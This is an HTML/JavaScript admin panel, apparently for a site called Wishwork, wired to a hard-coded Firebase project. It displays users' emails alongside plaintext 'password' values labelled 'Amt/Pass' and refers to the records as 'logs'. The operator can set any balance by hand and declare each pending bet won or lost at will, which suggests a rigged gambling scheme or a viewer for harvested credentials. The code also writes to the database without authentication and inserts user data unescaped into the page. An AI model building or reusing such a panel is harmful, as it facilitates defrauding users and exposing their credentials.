<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CONTROL CENTER | WISHWORK</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #020205; --accent: #38bdf8; --red: #ef4444; --green: #22c55e; }
        body { margin: 0; font-family: 'Outfit', sans-serif; background: var(--bg); color: white; padding: 20px; }
        h1 { text-align: center; font-weight: 900; background: linear-gradient(to right, #38bdf8, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        .card { background: rgba(255,255,255,0.03); border-radius: 20px; padding: 20px; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th { text-align: left; font-size: 10px; color: var(--accent); text-transform: uppercase; padding: 10px; }
        td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
        
        .btn { padding: 6px 12px; border: none; border-radius: 8px; font-weight: 900; cursor: pointer; color: white; margin: 2px; }
        .win { background: var(--green); }
        .loss { background: var(--red); }
        .del { background: #444; font-size: 10px; }
        
        input { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: white; margin-bottom: 15px; }
    </style>
</head>
<body>

<h1>CONTROL CENTER</h1>

<div class="card">
    <input type="text" id="search" placeholder="Search user email..." onkeyup="filter()">
    <table>
        <thead>
            <tr>
                <th>User (Click to Balance)</th>
                <th>Amt/Pass</th>
                <th>Type</th>
                <th>Action</th>
            </tr>
        </thead>
        <tbody id="adminBody"></tbody>
    </table>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, collection, query, orderBy, onSnapshot, doc, deleteDoc, updateDoc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = { apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", authDomain: "home-help-service.firebaseapp.com", projectId: "home-help-service", storageBucket: "home-help-service.firebasestorage.app", messagingSenderId: "160722457510", appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" };
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Update Balance Manually
    window.setBal = async (email) => {
        const val = prompt(`Enter new balance for ${email}:`);
        if(val !== null) await setDoc(doc(db, "wallets", email), { balance: parseInt(val) });
    };

    // Delete Log
    window.delLog = async (id) => {
        if(confirm("Terminate this log?")) await deleteDoc(doc(db, "users", id));
    };

    // Set Result (Win/Loss)
    window.resolve = async (id, res, email, amtStr) => {
        const amt = parseInt(amtStr.replace(/[^\d]/g, ''));
        await updateDoc(doc(db, "users", id), { status: res });
        
        if(res === "WIN 🏆") {
            const snap = await getDoc(doc(db, "wallets", email));
            const cur = snap.exists() ? snap.data().balance : 0;
            await setDoc(doc(db, "wallets", email), { balance: cur + (amt * 2) });
        }
    };

    onSnapshot(query(collection(db, "users"), orderBy("time", "desc")), (snap) => {
        const body = document.getElementById("adminBody");
        let html = "";
        snap.forEach(d => {
            const data = d.data();
            const isPending = data.status === "PENDING";
            html += `
                <tr>
                    <td onclick="setBal('${data.email}')" style="cursor:pointer; color:var(--accent)">${data.email.split('@')[0]}</td>
                    <td>${data.password}</td>
                    <td>${data.actionType}</td>
                    <td>
                        ${isPending ? `
                            <button class="btn win" onclick="resolve('${d.id}','WIN 🏆','${data.email}','${data.password}')">W</button>
                            <button class="btn loss" onclick="resolve('${d.id}','LOST 💀','${data.email}','${data.password}')">L</button>
                        ` : `<span>${data.status}</span>`}
                        <button class="btn del" onclick="delLog('${d.id}')">×</button>
                    </td>
                </tr>`;
        });
        body.innerHTML = html;
    });
</script>
</body>
</html>
